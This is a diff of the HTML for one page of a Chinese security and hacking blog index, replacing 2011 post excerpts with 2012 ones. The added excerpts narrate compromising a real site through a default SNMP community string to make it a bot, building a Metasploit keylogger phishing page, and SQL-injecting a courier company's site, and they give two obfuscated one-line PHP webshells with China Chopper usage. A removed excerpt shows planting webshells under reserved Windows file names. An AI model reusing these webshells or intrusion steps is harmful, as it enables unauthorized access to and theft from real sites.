@@ -45,51 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-07-12T01:15:47.000Z" itemprop="datePublished">
-          2011-07-12
-      </time>
-    
-</span>
-      <h2 class="post-title"><a href="/38.seo/">2011年7月编程语言排行榜：Objective-C将成为年度语言</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-         编程语言排行榜前10位的长期走势图：  20到50名： 
-      
-      </p>
-      
-      <p>
-          <a href="/38.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2011-07-07T19:11:22.000Z" itemprop="datePublished">
-          2011-07-08
+      <time datetime="2012-06-14T04:41:27.000Z" itemprop="datePublished">
+          2012-06-14
       </time>
     
     
     | 
-    <a href='/tag/Tutorial/'>Tutorial</a>
+    <a href='/tag/入侵/'>入侵</a>,
+    
+    <a href='/tag/snmp/'>snmp</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/37.seo/">ettercap DHCP spoofing MITM attack</a></h2>
+      <h2 class="post-title"><a href="/522.seo/">snmp弱口令在一次常规入侵中的应用</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        中间人攻击：用Ettercap进行DHCP欺骗  
+        <p>常常见到论坛里面或qq里面有人问snmp的若口令怎么利用，其实网上已经有了一些关于snmp弱口令的介绍，无奈的是，我还没有看到谁做过教程，刚好这次入侵过程中snmp弱口令给了我很大的启发，于是就把他写了下来，希望给大家一些启发。</p>  <p>最近看到某个主页做得很烂，似乎很长时间没有做过维护了，不巧他的网速很快，于是我有了把他做成肉鸡的念头。首先当然是刺探信息了，开了x-scan,扫了一会儿，结果出来了：</p>  <p>主机地址</p>  <p>端口/服务</p>  <p>服务漏洞</p>  <p>202.<em>.</em>.<em> ftp (21/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> telnet (23/tcp) 发现安全提示</p>  <p>202.<em>.</em>.<em> unknown (1080/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> www (80/tcp) 发现安全漏洞</p>  <p>202.<em>.</em>.<em> unknown (3389/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> snmp (161/udp) 发现安全漏洞</p>  <p>漏洞 snmp (161/udp) Snmp口令: &quot;public&quot;</p>
       
       </p>
       
       <p>
-          <a href="/37.seo/" class="excerpt-link">Read More...</a>
+          <a href="/522.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -98,27 +76,33 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-07-07T18:44:18.000Z" itemprop="datePublished">
-          2011-07-08
+      <time datetime="2012-06-13T22:52:02.000Z" itemprop="datePublished">
+          2012-06-14
       </time>
     
     
     | 
-    <a href='/tag/Webshell/'>Webshell</a>
+    <a href='/tag/Metasploit/'>Metasploit</a>,
+    
+    <a href='/tag/窃听/'>窃听</a>,
+    
+    <a href='/tag/网络钓鱼/'>网络钓鱼</a>,
+    
+    <a href='/tag/keylogger/'>keylogger</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/36.seo/">打造永不被删除的webshell</a></h2>
+      <h2 class="post-title"><a href="/519.seo/">如何利用Metasploit制造一个键盘窃听网站</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        Windows 下不能够以下面这些字样来命名文件/文件夹，包括：“aux”，“com1”“com2”“prn”“con”和“nul”等，但是通过cmd下是可以创建此类文件夹的，使用copy命令即可实现：   D:\wwwroot&gt;copy rootkit.asp \.\D:\wwwroot\aux.asp   已复制 1 个文件。   D:\AspWebServer\wwwroot&gt;dir   驱动器 D 中的卷没有标签。 
+        <p><b>大家都应该知道网络钓鱼是什么吧，那么接下来这篇文章会来讲述如何利用</b><b>Metasploit</b><b>制造一个键盘窃听网站。</b></p>  <p><b>网络钓鱼的历史：</b></p>  <p>网络钓鱼技术始于1987年，于1995年被第一次发现。</p>  <p>攻击者通过钓鱼技术获取受害者的一些信息，包括用户名、密码、信用卡细节等等。   <br />一般来说，攻击者会制造一个假冒的网站诱惑受害者进入并输入他的信息，比如仿造gmail、雅虎、facebook的登录框。</p>  <p><b>Javascript keylogger</b><b>简介：</b></p>  <p>Javascript keylogger可以捕捉通过网络的键盘击键事件。   <br />使用JavaScript keylogger的优势在于：他不需要我们预先拥有一个服务器空间，然后再上传一个假冒的网页，写伪造的页面、插链接</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[4]" border="0" alt="clip_image001[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0014.png" width="541" height="231" /></p>  <p>再写个蛋疼的采集脚本（如下图）…<img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[4]" border="0" alt="clip_image002[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0024.png" width="585" height="144" /></p>  <p><b>使用</b><b>Metasploit</b><b>制造键盘窃听网站：</b></p>  <p>1. 打开msfconsle</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[4]" border="0" alt="clip_image004[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0044.jpg" width="558" height="356" /></p>
       
       </p>
       
       <p>
-          <a href="/36.seo/" class="excerpt-link">Read More...</a>
+          <a href="/519.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -127,28 +111,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-07-07T00:59:42.000Z" itemprop="datePublished">
-          2011-07-07
+      <time datetime="2012-06-13T09:06:02.000Z" itemprop="datePublished">
+          2012-06-13
       </time>
     
     
     | 
-    <a href='/tag/Ruby/'>Ruby</a>
+    <a href='/tag/oracle注入/'>oracle注入</a>,
+    
+    <a href='/tag/渗透实例/'>渗透实例</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/32.seo/">松本行弘为什么开发Ruby</a></h2>
+      <h2 class="post-title"><a href="/516.seo/">对著名快递公司的一次艰难的oracle注入</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><blockquote><br>    <p>学好Ruby。</p><br></blockquote></p>
-<p>Ruby是起源于日本的编程语言。近年来，特别是因为在Web开发方面的效率很高，Ruby引起了全世界的关注，它的应用范围也扩展到了很多企业领域。 <br /><br>    作为一门编程语言，Ruby正在被越来越多的人所了解，而作为一介工程师的我，松本行弘，刚开始的时候并没有想过&ldquo;让全世界的人都来用它&rdquo;或者&ldquo;这下子可以大赚一笔了&rdquo;，一个仅仅是从兴趣开始的项目却在不知不觉中发展成了如今的样子。 <br /><br>    当然了，作为一种兴趣，开发Ruby并不是我的本职工作，我是把它作为一个自由软件来开发的。但是世事弄人，现在开发Ruby竟然变成我的本职工作了，想想也有些不可思议。 <br /><br>    &ldquo;你为什么开发Ruby？&rdquo;每当有人这样问我 的时候，我想，最合适的回答应该就像Linux的开发者Linus Torvalds对&ldquo;为什么开发Linux&rdquo;的回答一样吧。 <br /><br>    &ldquo;因为它给我带来了快乐。&rdquo; <br /><br>    当我还是一个高中生，刚刚开始学习编程的时候，不知何故，就开始对编程语言产生了兴趣。 <br /><br>    周围很多喜欢计算机 的人，有的是&ldquo;想开发游戏&rdquo;，有的是&ldquo;想用它来做计算&rdquo;，等等，都是&ldquo;想用计算机来做些什么&rdquo;。而我呢，则对&ldquo;要用什么编程语言来开发&rdquo;、&ldquo;用什么语言开发更快乐&rdquo;有很大的兴趣。 <br /><br>    高中的时候，自己并不具备开发一种编程语言所必需的技术、知识，而且当时也没有计算机。但是，我看了很多编程语言类的书籍和杂志，知道了&ldquo;还有像Lisp这样优秀的编程语言&rdquo;、&ldquo;Smalltalk是面向对象设计的&rdquo;，等等，在这些方面很着迷。上大学时就自然而然地选修了计算机语言研究的专业。10年后，通过开发Ruby实现了自己的梦想。 <br /><br>    从1993年开始开发Ruby到现在已经过去16年了。在这么久的时间里，我从未因为设计Ruby而感到过厌烦。开发编程语言真是一件非常有意思的事情。</p><br><p>编程语言的重要性 <br /><br>    为什么会这么喜欢编程语言？我自己也说不清。至少，我知道编程语言是非常重要的。 <br /><br>    最根本的理由是：语言乃人类思考的本质。在地球上，没有任何超越人类智慧的生物，也只有人类能够使用语言。所以，正是因为语言，才造成了人类和别的生物的区别。正是因为语言，人和人之间才能传递知识和交流，才能做深入的思考。如果没有了语言，人类和别的动物也就不会有太大的区别了。 <br /><br>    在语言学领域里，有一个Sapir-Whirf假说，认为语言可以影响说话者的思想。也就是说，因为语言的不同，所以造成了思想的不同。人类的自然语言是不是像这个假说一样，我不是很清楚 ，但是我觉得计算机语言很符合这个假说。也就是说，程序员由于使用的编程语言不同，他的思考方法和编写出来的代码都会受到编程语言的很大影响。 <br /><br>    也可以这么说，如果我们选择了好的编程语言的话，那么成为好程序员的可能性就会大很多。 <br /><br>    20年来一直被奉为名著的《人月神话》的作者Frederick P.Brooks说过，一个程序员，不管他使用什么编程语言，他在一定的时间里编写的程序行数是一定的。如果真是这样的话，如果一个程序员一天可以写500行程序的话，那么不论他用汇编、C，还是Ruby，那么他一天都应该可以写500行程序。 <br /><br>    但是，汇编的500行程序和Ruby的500行程序所能做的事情是有天壤之别的。程序员根据所选择编程语言的不同，他的开发效率就会有10倍、100倍，甚至1000倍的差别。 <br /><br>    由于低价格化和高性能化，计算机现在已经很普及了。现在基本上各个领域都使用了计算机，但如果没有计算机软件，那么计算机这个盒子恐怕一点用都没有。而谈到软件开发，就要求能够用更少的成本，更短的时间，开发出更多的软件。 <br /><br>    需要开发的软件越来越多，但是开发成本却有限，所以对于开发效率的要求就很高。编程语言就成了解决这个矛盾的重要工具。
+        <p>作者：rebeyond</p>  <p>● 轻车熟路    <br />一个对新飞鸿有意见的亲密朋友找我说能不能把这个公司的网站给搞了，我一听公司，心想，企业站都是垃圾，好搞，便痛快答应（人品真好！），呵呵，但是后来才发现没我想像的那么简单。站面如图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="image" border="0" alt="image" src="http://img.cker.in/oracle_F4A/image.png" width="314" height="366" /> </p>
       
       </p>
       
       <p>
-          <a href="/32.seo/" class="excerpt-link">Read More...</a>
+          <a href="/516.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -157,32 +142,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-07-06T23:10:24.000Z" itemprop="datePublished">
-          2011-07-07
+      <time datetime="2012-06-13T09:01:56.000Z" itemprop="datePublished">
+          2012-06-13
       </time>
     
     
     | 
-    <a href='/tag/黑客/'>黑客</a>,
-    
-    <a href='/tag/黑帽/'>黑帽</a>,
-    
-    <a href='/tag/ATM/'>ATM</a>
+    <a href='/tag/Group-By一个不常用的用法/'>Group By一个不常用的用法</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/31.seo/">BalckHat2010 Barnaby Jack演示ATM自动吐钱</a></h2>
+      <h2 class="post-title"><a href="/514.seo/">Group By一个不常用的用法</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        BalckHat2010 Barnaby Jack演示ATM自动吐钱 
-
+        <p>乍一看，大家一定认为这有什么好写的呀，不就是group by 嘛，对指定列进行分组而已。我在这里说的是一个将被MS删除、不符合ISO语法的用法（大家可以在MS没有删除前显摆显摆嘛，至少2008没有删除）。好，那这是什么语法呢，那就是Group by ALL 。那它和不加ALL有什么差别呢？ 差别就是加了ALL后包含所有组和结果集，甚至包含那些其中任何行都不满足 WHERE 子句指定的搜索条件的组和结果集。注意的是指定了 ALL，将对组中不满足搜索条件的汇总列返回空值。 </p>
       
       </p>
       
       <p>
-          <a href="/31.seo/" class="excerpt-link">Read More...</a>
+          <a href="/514.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -191,22 +171,60 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-07-06T16:49:08.000Z" itemprop="datePublished">
-          2011-07-07
+      <time datetime="2012-06-13T08:54:05.000Z" itemprop="datePublished">
+          2012-06-13
       </time>
     
+    
+    | 
+    <a href='/tag/ASP/'>ASP</a>,
+    
+    <a href='/tag/FSO/'>FSO</a>,
+    
+    <a href='/tag/ASP中FSO的神奇功能/'>ASP中FSO的神奇功能</a>
+    
+    
 </span>
-      <h2 class="post-title"><a href="/30.seo/">Transformers 3 Dark of the Moon 变形金刚：月黑之时</a></h2>
+      <h2 class="post-title"><a href="/512.seo/">ASP中FSO的神奇功能</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><p><strong>变形金刚3</strong></p>  <p><strong>上映:</strong>2011</p>  <p><strong>播放:</strong>11,875,368</p>  <p><strong>导演:</strong>迈克尔·贝</p>  <p><strong>主演:</strong>希亚·拉博夫罗茜·汉丁顿-惠特莉乔什·杜哈明约翰·马尔科维奇雨果·维文肯·郑帕特里克·德姆西</p>  <p><strong>地区:</strong>加拿大</p>  <p><strong>类型:</strong>动作冒险科幻</p>  <p><strong>语言:</strong>英语 </p>  <p><strong>片长:</strong>90分钟</p>  <h4>变形金刚3 - 剧情</h4>  <p>第三集里擎天柱将率领着汽车人继续与第二集失败后卷土重来的“霸天虎”作战，大反派“震荡波”全新登场。</p>  <p><img src="http://images.movie.xunlei.com/gallery/590/450a4185dabd659f06715db456eb7fca.jpg" /></p>
+        <p>在ASP中，FSO的意思是File System Object，即文件系统对象。 </p>  <p> 我们将要操纵的计算机文件系统，在这里是指位于web服务器之上。所以，确认你对此拥有合适的权限。理想情况下，你可以在自己的机器上建立一个web服务器，这样就能方便地进行测试。如果运行于Windows平台，请试一试微软公司的免费个人Web服务器PWS。 </p>  <p> FSO 模型对象 </p>  <p> Drive Object：驱动器对象 供存取磁盘或者网络驱动器    <br /> FileSystemObject Object：文件系统对象 供存取计算机的文件系统     <br /> Folder Object：文件夹对象 供存取文件夹的所有属性     <br /> TextStream Object：文本流对象 供存取文件内容 </p>  <p> 你可以使用上面的对象做计算机上的任何事情，也包括破坏活动 ;-( 所以，请小心使用FSO。在web环境中，存储信息是非常重要的，比如用户信息，日志文件，等等。FSO提供了一个强大且简单的方法高效率地保存数据。在这篇文章里面，着重讨论FileSystemObject和TextStream对象。 </p>  <p> FSO由微软公司提供支持，对于非Windows系统，大概不能再使用ASP。 </p>  <p> 怎么样使用FSO？ </p>  <p> 为了使用FSO来执行所有的工作，首先要创建对象，代码就象下面这样： </p>  <p>＜ % Set fso = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;) % ＞ </p>
       
       </p>
       
       <p>
-          <a href="/30.seo/" class="excerpt-link">Read More...</a>
+          <a href="/512.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-06-12T10:59:46.000Z" itemprop="datePublished">
+          2012-06-12
+      </time>
+    
+    
+    | 
+    <a href='/tag/一句话/'>一句话</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/510.seo/">两个变形的一句话php马</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>在t00ls里论坛看到的，原来在<a href="http://www.t00ls.net/thread-18388-4-1.html。不过他们的楼上的方法都不好，我回复了一下，就是这样：">http://www.t00ls.net/thread-18388-4-1.html。不过他们的楼上的方法都不好，我回复了一下，就是这样：</a> </p>  <p>不过何必像楼上的生成文件再用哪么麻烦呢？   <br />第一种：1.php    <br />&lt; ?php ($_=@$<em>GET[2]).@$</em>($<em>POST[1])?&gt;    <br />我变了一下，在菜刀里写<a href="http://127.0.0.1:88/1.php?2=assert密码是1">http://127.0.0.1:88/1.php?2=assert密码是1</a>    <br />第二种2.php    <br />&lt; ?php    <br />$</em>=&quot;&quot;;    <br />$<em>[+&quot;&quot;]=’’;    <br />$</em>=&quot;$<em>&quot;.&quot;&quot;;    <br />$</em>=($<em>[+&quot;&quot;]|&quot;&quot;).($</em>[+&quot;&quot;]|&quot;&quot;).($<em>[+&quot;&quot;]^&quot;&quot;);    <br />?&gt;    <br />&lt; ?php ${‘</em>‘.$<em>}[‘</em>‘](${‘<em>‘.$</em>}[‘<strong>‘]);?&gt; </p>  <p>在菜刀里写   <br />&lt;a href=”<a href="http://127.0.0.1:88/3.php?_=assert&amp;amp">http://127.0.0.1:88/3.php?_=assert&amp;amp</a>;</strong>=eval(“&gt;<a href="http://127.0.0.1:88/3.php?_=assert&amp;__=eval(">http://127.0.0.1:88/3.php?_=assert&amp;__=eval(</a></a>$_POST[‘pass’]) 密码是pass </p>  <p>这两种就可以直接用菜刀了。   <br />不过我是直接写在url里，如果你用菜刀的附加数据的话更隐蔽，因为是post提交的。</p>
+      
+      </p>
+      
+      <p>
+          <a href="/510.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -214,7 +232,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/page/54/">← Newer Posts</a>
-    <span class="page-number">Page 55 of 57</span>
+    <span class="page-number">Page 55 of 81</span>
     <a class="older-posts" href="/page/56/">Older Posts →</a>
   </nav>
 </main>
